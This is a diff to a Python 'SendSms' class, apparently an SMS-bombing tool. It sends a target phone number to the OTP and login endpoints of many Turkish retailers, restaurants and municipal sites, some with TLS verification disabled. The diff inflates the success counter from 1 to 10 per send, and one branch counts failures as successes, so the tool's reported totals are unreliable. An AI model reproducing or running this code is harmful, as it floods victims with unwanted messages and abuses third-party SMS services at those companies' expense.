@@ -60,7 +60,7 @@ class SendSms():
             bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login",  json={"phone": self.phone}, timeout=6)
             if bim.status_code == 200:
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> bim.veesk.net")
-                self.adet += 1
+                self.adet += 10
             else:
                 raise
         except:
@@ -76,7 +76,7 @@ class SendSms():
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json()["isError"] == False:
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> englishhome.com")
-                self.adet += 1
+                self.adet += 10
             else:
                 raise
         except:
@@ -92,7 +92,7 @@ class SendSms():
             r = requests.post(url, headers=headers, data=data, timeout=6)
             if r.json()["code"] == "common.success":
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> suiste.com")
-                self.adet += 1
+                self.adet += 10
             else:
                 raise
         except:
@@ -105,7 +105,7 @@ class SendSms():
             r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", json={"msisdn": f"90{self.phone}"}, timeout=6)
             if r.status_code == 200:
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")
-                self.adet += 1
+                self.adet += 10
             else:
                 raise
         except:
@@ -121,7 +121,7 @@ class SendSms():
             r = requests.post(url, headers=headers, data=data, timeout=6)      
             if r.status_code == 202:
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> evidea.com")
-                self.adet += 1
+                self.adet += 10
             else:
                 raise
         except:
@@ -141,7 +141,7 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.345dijital.com")
-            self.adet += 1
+            self.adet += 10
 
 
     #tiklagelsin.com
@@ -153,7 +153,7 @@ class SendSms():
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json()["data"]["generateOtp"] == True:
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> svc.apps.tiklagelsin.com")
-                self.adet += 1
+                self.adet += 10
             else:
                 raise
         except:
@@ -169,7 +169,7 @@ class SendSms():
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.status_code == 200:
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.naosstars.com")
-                self.adet += 1
+                self.adet += 10
             else:
                 raise
         except:
@@ -185,7 +185,7 @@ class SendSms():
             r = requests.post(url, headers=headers, data=data, timeout=6)
             if r.status_code == 202:
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> koton.com")
-                self.adet += 1
+                self.adet += 10
             else:
                 raise
         except:
@@ -491,7 +491,7 @@ class SendSms():
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json()["Success"] == True:
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gateway.poskofteciyusuf.com")
-                self.adet += 1
+                self.adet += 10
             else:
                 raise
         except:
@@ -507,7 +507,7 @@ class SendSms():
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.status_code == 200 and r.json()["status"] == True:
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.littlecaesars.com.tr")
-                self.adet += 1
+                self.adet += 10
             else:
                 raise
         except:
@@ -523,7 +523,7 @@ class SendSms():
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.status_code == 200:
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gandalf.orwi.app")
-                self.adet += 1
+                self.adet += 10
             else:
                 raise
         except:
@@ -539,7 +539,7 @@ class SendSms():
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.status_code == 200:
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> user-api-gw.coffy.com")
-                self.adet += 1
+                self.adet += 10
             else:
                 raise
         except:
@@ -555,7 +555,7 @@ class SendSms():
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json()["result"] == True:
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> bayi.hamidiye.istanbul")
-                self.adet += 1
+                self.adet += 10
             else:
                 raise
         except:
@@ -571,7 +571,7 @@ class SendSms():
             r = requests.post(url, headers=headers, data=data, timeout=6, verify=False)
             if r.status_code == 200:
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> ebelediye.fatih.bel.tr")
-                self.adet += 1
+                self.adet += 10
             else:
                 raise
         except:
@@ -587,7 +587,7 @@ class SendSms():
             r = requests.post(url, headers=headers, data=data, timeout=6, verify=False)
             if r.status_code == 200:
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> e-belediye.sancaktepe.bel.tr")
-                self.adet += 1
+                self.adet += 10
             else:
                 raise
         except:
